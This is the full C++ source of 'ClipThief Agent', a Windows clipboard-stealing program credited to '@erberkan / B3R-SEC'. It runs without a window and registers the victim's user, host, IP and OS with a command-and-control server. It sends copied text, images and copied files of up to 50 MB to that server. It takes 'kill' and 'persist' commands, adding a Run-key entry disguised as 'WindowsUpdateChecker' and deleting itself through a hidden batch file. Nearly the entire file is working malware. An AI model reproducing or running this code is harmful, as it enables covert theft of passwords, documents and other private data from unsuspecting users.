/*
 * ClipThief Agent
 * @erberkan / B3R-SEC
 *
 * Clipboard monitoring agent with C2 communication.
 * Capabilities: system info exfil, text/image/file clipboard capture,
 *               command polling (kill / persist via HKCU Run registry key).
 *
 * Libs required (via #pragma): wininet, ws2_32, rpcrt4, shell32
 */

#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

// winsock2.h must be included before windows.h
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <wininet.h>
#include <shellapi.h>
#include <rpc.h>        // UuidCreate, UuidToStringA

#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <algorithm>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "shell32.lib")

// ============================================================
//  Config
// ============================================================
static const char* C2_HOST    = "127.0.0.1";
static const int   C2_PORT    = 5000;
static const int   POLL_MS    = 3000;
static const char* REG_PATH   = "Software\\Microsoft\\Windows\\CurrentVersion\\ClipAgent";
static const char* TASK_NAME  = "WindowsUpdateChecker"; // HKCU Run value name
static const size_t MAX_FILE  = 50 * 1024 * 1024; // 50 MB cap for file uploads

// ============================================================
//  Globals
// ============================================================
static std::string   g_agentId;
static HWND          g_hwnd   = NULL;
static volatile bool g_running = true;

// ============================================================
//  UUID Generation
// ============================================================
static std::string GenerateUUID()
{
    UUID uuid = {};
    UuidCreate(&uuid);

    RPC_CSTR rpcStr = nullptr;
    UuidToStringA(&uuid, &rpcStr);
    std::string result(reinterpret_cast<char*>(rpcStr));
    RpcStringFreeA(&rpcStr);
    return result;
}

// ============================================================
//  Agent ID — persisted in registry
// ============================================================
static std::string LoadOrCreateAgentId()
{
    HKEY hKey = NULL;
    char buf[64] = {};
    DWORD size   = sizeof(buf);

    if (RegOpenKeyExA(HKEY_CURRENT_USER, REG_PATH, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "AgentID", NULL, NULL, (LPBYTE)buf, &size);
        RegCloseKey(hKey);
        if (strlen(buf) > 0)
            return std::string(buf);
    }

    std::string id = GenerateUUID();
    if (RegCreateKeyExA(HKEY_CURRENT_USER, REG_PATH, 0, NULL, 0,
                        KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "AgentID", 0, REG_SZ,
                       (const BYTE*)id.c_str(), (DWORD)(id.size() + 1));
        RegCloseKey(hKey);
    }
    return id;
}

// ============================================================
//  Base64 Encoder
// ============================================================
static const char B64_TABLE[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static std::string Base64Encode(const BYTE* data, size_t len)
{
    std::string out;
    out.reserve(((len + 2) / 3) * 4);

    for (size_t i = 0; i < len; i += 3) {
        unsigned int b  = (unsigned int)data[i] << 16;
        bool have2 = (i + 1 < len);
        bool have3 = (i + 2 < len);
        if (have2) b |= (unsigned int)data[i + 1] << 8;
        if (have3) b |= (unsigned int)data[i + 2];

        out += B64_TABLE[(b >> 18) & 0x3F];
        out += B64_TABLE[(b >> 12) & 0x3F];
        out += have2 ? B64_TABLE[(b >>  6) & 0x3F] : '=';
        out += have3 ? B64_TABLE[(b      ) & 0x3F] : '=';
    }
    return out;
}

static std::string Base64EncodeVec(const std::vector<BYTE>& v)
{
    if (v.empty()) return "";
    return Base64Encode(v.data(), v.size());
}

static std::string Base64EncodeStr(const std::string& s)
{
    return Base64Encode(reinterpret_cast<const BYTE*>(s.data()), s.size());
}

// ============================================================
//  JSON helpers  (no external lib)
// ============================================================
static std::string JsonEscape(const std::string& s)
{
    std::string out;
    out.reserve(s.size());
    for (unsigned char c : s) {
        if      (c == '"')  out += "\\\"";
        else if (c == '\\') out += "\\\\";
        else if (c == '\n') out += "\\n";
        else if (c == '\r') out += "\\r";
        else if (c == '\t') out += "\\t";
        else                out += (char)c;
    }
    return out;
}

// Parses a JSON string value — handles optional whitespace after colon (Flask: "key": "value")
static std::string JsonGetString(const std::string& json, const std::string& key)
{
    std::string needle = "\"" + key + "\"";
    size_t pos = json.find(needle);
    if (pos == std::string::npos) return "";
    pos += needle.size();
    // Skip any whitespace and the colon between key and value
    while (pos < json.size() && (json[pos] == ' ' || json[pos] == ':' || json[pos] == '\t'))
        ++pos;
    if (pos >= json.size() || json[pos] != '"') return "";
    ++pos; // skip opening quote
    size_t end = json.find('"', pos);
    if (end == std::string::npos) return "";
    return json.substr(pos, end - pos);
}

// ============================================================
//  HTTP helpers — WinINet
// ============================================================
static bool HttpPost(const std::string& path,
                     const std::string& body,
                     std::string&       response)
{
    HINTERNET hInet = InternetOpenA("Agent/1.0",
                                    INTERNET_OPEN_TYPE_DIRECT,
                                    NULL, NULL, 0);
    if (!hInet) return false;

    HINTERNET hConn = InternetConnectA(hInet, C2_HOST, (INTERNET_PORT)C2_PORT,
                                       NULL, NULL,
                                       INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) { InternetCloseHandle(hInet); return false; }

    HINTERNET hReq = HttpOpenRequestA(hConn, "POST", path.c_str(),
                                      NULL, NULL, NULL,
                                      INTERNET_FLAG_RELOAD |
                                      INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hReq) {
        InternetCloseHandle(hConn);
        InternetCloseHandle(hInet);
        return false;
    }

    const char* hdr = "Content-Type: application/json\r\n";
    BOOL ok = HttpSendRequestA(hReq, hdr, (DWORD)strlen(hdr),
                               (LPVOID)body.c_str(), (DWORD)body.size());
    if (ok) {
        char buf[8192];
        DWORD read = 0;
        while (InternetReadFile(hReq, buf, sizeof(buf) - 1, &read) && read > 0) {
            buf[read] = '\0';
            response += buf;
        }
    }

    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    InternetCloseHandle(hInet);
    return ok == TRUE;
}

static bool HttpGet(const std::string& path, std::string& response)
{
    HINTERNET hInet = InternetOpenA("Agent/1.0",
                                    INTERNET_OPEN_TYPE_DIRECT,
                                    NULL, NULL, 0);
    if (!hInet) return false;

    HINTERNET hConn = InternetConnectA(hInet, C2_HOST, (INTERNET_PORT)C2_PORT,
                                       NULL, NULL,
                                       INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) { InternetCloseHandle(hInet); return false; }

    HINTERNET hReq = HttpOpenRequestA(hConn, "GET", path.c_str(),
                                      NULL, NULL, NULL,
                                      INTERNET_FLAG_RELOAD |
                                      INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hReq) {
        InternetCloseHandle(hConn);
        InternetCloseHandle(hInet);
        return false;
    }

    BOOL ok = HttpSendRequestA(hReq, NULL, 0, NULL, 0);
    if (ok) {
        char buf[4096];
        DWORD read = 0;
        while (InternetReadFile(hReq, buf, sizeof(buf) - 1, &read) && read > 0) {
            buf[read] = '\0';
            response += buf;
        }
    }

    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    InternetCloseHandle(hInet);
    return ok == TRUE;
}

// ============================================================
//  System information
// ============================================================
static std::string GetUsername()
{
    char buf[256] = {};
    DWORD sz = sizeof(buf);
    GetUserNameA(buf, &sz);
    return buf;
}

static std::string GetHostname()
{
    char buf[256] = {};
    DWORD sz = sizeof(buf);
    GetComputerNameA(buf, &sz);
    return buf;
}

static std::string GetLocalIP()
{
    char hostname[256] = {};
    gethostname(hostname, sizeof(hostname));

    addrinfo hints = {}, *res = nullptr;
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    std::string ip = "unknown";
    if (getaddrinfo(hostname, NULL, &hints, &res) == 0 && res) {
        char ipStr[INET_ADDRSTRLEN] = {};
        inet_ntop(AF_INET,
                  &reinterpret_cast<sockaddr_in*>(res->ai_addr)->sin_addr,
                  ipStr, sizeof(ipStr));
        ip = ipStr;
        freeaddrinfo(res);
    }
    return ip;
}

static std::string GetOSVersion()
{
    // Use RtlGetVersion (works on all Windows versions, bypasses compat shims)
    typedef LONG(WINAPI* RtlGetVersionFn)(RTL_OSVERSIONINFOW*);
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        auto fn = reinterpret_cast<RtlGetVersionFn>(
            GetProcAddress(ntdll, "RtlGetVersion"));
        if (fn) {
            RTL_OSVERSIONINFOW info = {};
            info.dwOSVersionInfoSize = sizeof(info);
            if (fn(&info) == 0) {
                char buf[64];
                snprintf(buf, sizeof(buf), "Windows %lu.%lu Build %lu",
                         info.dwMajorVersion, info.dwMinorVersion,
                         info.dwBuildNumber);
                return buf;
            }
        }
    }
    return "Windows";
}

// ============================================================
//  Agent registration
// ============================================================
static void RegisterAgent()
{
    std::string user     = GetUsername();
    std::string hostname = GetHostname();
    std::string ip       = GetLocalIP();
    std::string os       = GetOSVersion();

    std::string body =
        "{\"id\":\""       + JsonEscape(g_agentId) + "\","
        "\"user\":\""      + JsonEscape(user)      + "\","
        "\"hostname\":\""  + JsonEscape(hostname)  + "\","
        "\"ip\":\""        + JsonEscape(ip)        + "\","
        "\"os\":\""        + JsonEscape(os)        + "\"}";

    std::string resp;
    HttpPost("/api/agent/register", body, resp);
}

// ============================================================
//  Clipboard sender
// ============================================================
static void SendClipboard(const std::string& type,
                          const std::string& contentB64,
                          const std::string& filename)
{
    std::string path = "/api/agent/" + g_agentId + "/clipboard";
    std::string body =
        "{\"type\":\""     + JsonEscape(type)       + "\","
        "\"content\":\""   + contentB64             + "\","
        "\"filename\":\""  + JsonEscape(filename)   + "\"}";

    std::string resp;
    HttpPost(path, body, resp);
}

// ============================================================
//  DIB → BMP bytes  (CF_DIB payload -> valid .bmp file bytes)
// ============================================================
static std::vector<BYTE> DibToBmp(HGLOBAL hGlobal)
{
    SIZE_T dataSize = GlobalSize(hGlobal);
    BYTE*  pData    = static_cast<BYTE*>(GlobalLock(hGlobal));
    if (!pData) return {};

    const BITMAPINFOHEADER* bih = reinterpret_cast<BITMAPINFOHEADER*>(pData);

    // Color table size (for indexed bitmaps)
    DWORD colorTableSize = 0;
    if (bih->biBitCount <= 8) {
        DWORD numColors = bih->biClrUsed ? bih->biClrUsed : (1u << bih->biBitCount);
        colorTableSize = numColors * sizeof(RGBQUAD);
    }

    BITMAPFILEHEADER bfh = {};
    bfh.bfType    = 0x4D42; // 'BM'
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + bih->biSize + colorTableSize;
    bfh.bfSize    = static_cast<DWORD>(sizeof(BITMAPFILEHEADER) + dataSize);

    std::vector<BYTE> result(bfh.bfSize);
    memcpy(result.data(), &bfh, sizeof(bfh));
    memcpy(result.data() + sizeof(bfh), pData, dataSize);

    GlobalUnlock(hGlobal);
    return result;
}

// ============================================================
//  Clipboard update handler
// ============================================================
static void HandleClipboardUpdate()
{
    if (!OpenClipboard(NULL)) return;

    // --- Unicode text ---
    if (IsClipboardFormatAvailable(CF_UNICODETEXT)) {
        HANDLE hData = GetClipboardData(CF_UNICODETEXT);
        if (hData) {
            wchar_t* wtext = static_cast<wchar_t*>(GlobalLock(hData));
            if (wtext) {
                int szNeeded = WideCharToMultiByte(CP_UTF8, 0, wtext, -1,
                                                   NULL, 0, NULL, NULL);
                if (szNeeded > 1) {
                    std::string utf8(szNeeded - 1, '\0');
                    WideCharToMultiByte(CP_UTF8, 0, wtext, -1,
                                        &utf8[0], szNeeded, NULL, NULL);
                    GlobalUnlock(hData);
                    CloseClipboard();
                    SendClipboard("text", Base64EncodeStr(utf8), "");
                    return;
                }
                GlobalUnlock(hData);
            }
        }
    }

    // --- File drop ---
    if (IsClipboardFormatAvailable(CF_HDROP)) {
        HANDLE hData = GetClipboardData(CF_HDROP);
        if (hData) {
            HDROP hDrop = static_cast<HDROP>(GlobalLock(hData));
            if (hDrop) {
                UINT count = DragQueryFileA(hDrop, 0xFFFFFFFF, NULL, 0);
                for (UINT i = 0; i < count && i < 5; ++i) {
                    char path[MAX_PATH] = {};
                    if (!DragQueryFileA(hDrop, i, path, MAX_PATH)) continue;

                    std::ifstream file(path, std::ios::binary);
                    if (!file.is_open()) continue;

                    // Read up to MAX_FILE bytes
                    std::vector<BYTE> data;
                    data.reserve(65536);
                    char chunk[65536];
                    while (file && data.size() < MAX_FILE) {
                        file.read(chunk, sizeof(chunk));
                        std::streamsize n = file.gcount();
                        if (n <= 0) break;
                        size_t take = static_cast<size_t>(n);
                        if (data.size() + take > MAX_FILE) take = MAX_FILE - data.size();
                        data.insert(data.end(), chunk, chunk + take);
                    }

                    // Extract filename only
                    std::string fullPath(path);
                    size_t slash = fullPath.rfind('\\');
                    std::string fname = (slash != std::string::npos)
                                        ? fullPath.substr(slash + 1)
                                        : fullPath;

                    SendClipboard("file", Base64EncodeVec(data), fname);
                }
                GlobalUnlock(hData);
            }
        }
        CloseClipboard();
        return;
    }

    // --- Image (DIB) ---
    if (IsClipboardFormatAvailable(CF_DIB)) {
        HANDLE hData = GetClipboardData(CF_DIB);
        if (hData) {
            std::vector<BYTE> bmpData = DibToBmp(hData);
            if (!bmpData.empty()) {
                CloseClipboard();
                SendClipboard("image", Base64EncodeVec(bmpData), "clipboard.bmp");
                return;
            }
        }
    }

    CloseClipboard();
}

// ============================================================
//  Self-destruct
// ============================================================
static void SelfDestruct()
{
    // Remove agent ID from registry
    RegDeleteKeyA(HKEY_CURRENT_USER, REG_PATH);

    // Remove persistence Run key if it was set
    HKEY hRun = NULL;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hRun) == ERROR_SUCCESS) {
        RegDeleteValueA(hRun, TASK_NAME);
        RegCloseKey(hRun);
    }

    // Schedule self-deletion via a small batch file
    char exePath[MAX_PATH] = {};
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    char tmpDir[MAX_PATH] = {};
    GetTempPathA(MAX_PATH, tmpDir);

    char batPath[MAX_PATH] = {};
    snprintf(batPath, MAX_PATH, "%scleanup_%lu.bat", tmpDir, GetCurrentProcessId());

    std::ofstream bat(batPath);
    if (bat.is_open()) {
        bat << "@echo off\r\n";
        bat << "ping 127.0.0.1 -n 4 >nul\r\n";
        bat << "del /f /q \"" << exePath << "\"\r\n";
        bat << "del /f /q \"%~f0\"\r\n";
        bat.close();

        ShellExecuteA(NULL, "open", batPath, NULL, NULL, SW_HIDE);
    }

    g_running = false;
    if (g_hwnd) PostMessage(g_hwnd, WM_QUIT, 0, 0);
    ExitProcess(0);
}

// ============================================================
//  Persistence — HKCU Run registry key (no admin required)
// ============================================================
static void AddPersistence()
{
    char exePath[MAX_PATH] = {};
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    // HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    // Triggered on every user login; no administrator privileges required.
    HKEY hKey = NULL;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, TASK_NAME, 0, REG_SZ,
                       (const BYTE*)exePath, (DWORD)(strlen(exePath) + 1));
        RegCloseKey(hKey);
    }
}

// ============================================================
//  Command polling thread
// ============================================================
static DWORD WINAPI CommandPollThread(LPVOID)
{
    std::string path = "/api/agent/" + g_agentId + "/command";

    while (g_running) {
        Sleep(POLL_MS);

        std::string resp;
        if (HttpGet(path, resp)) {
            std::string cmd = JsonGetString(resp, "command");
            if (cmd == "kill") {
                SelfDestruct();         // does not return
            } else if (cmd == "persist") {
                AddPersistence();
            }
        }
    }
    return 0;
}

// ============================================================
//  Window procedure
// ============================================================
static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg,
                                 WPARAM wParam, LPARAM lParam)
{
    switch (msg) {
    case WM_CLIPBOARDUPDATE:
        HandleClipboardUpdate();
        return 0;

    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wParam, lParam);
}

// ============================================================
//  Entry point
// ============================================================
//  Entry point — Windows subsystem (no console window)
// ============================================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int)
{
    // Winsock — needed for getLocalIP
    WSADATA wsa = {};
    WSAStartup(MAKEWORD(2, 2), &wsa);

    // Load or create persistent agent ID
    g_agentId = LoadOrCreateAgentId();

    // Register with C2 (retry silently if C2 is not up yet)
    RegisterAgent();

    // Create message-only window for clipboard events
    WNDCLASSW wc     = {};
    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = hInstance;
    wc.lpszClassName = L"ClipThiefWnd";

    if (!RegisterClassW(&wc))   return 1;

    g_hwnd = CreateWindowExW(0, wc.lpszClassName, L"",
                              0, 0, 0, 0, 0,
                              HWND_MESSAGE, NULL, hInstance, NULL);
    if (!g_hwnd)                return 2;
    if (!AddClipboardFormatListener(g_hwnd)) return 3;

    // Start command polling thread
    HANDLE hThread = CreateThread(NULL, 0, CommandPollThread, NULL, 0, NULL);

    // Message loop
    MSG msg = {};
    while (g_running) {
        BOOL ret = GetMessageW(&msg, NULL, 0, 0);
        if (ret == 0 || ret == -1) break;
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    // Cleanup
    RemoveClipboardFormatListener(g_hwnd);
    g_running = false;
    if (hThread) { WaitForSingleObject(hThread, 2000); CloseHandle(hThread); }
    WSACleanup();
    return 0;
}
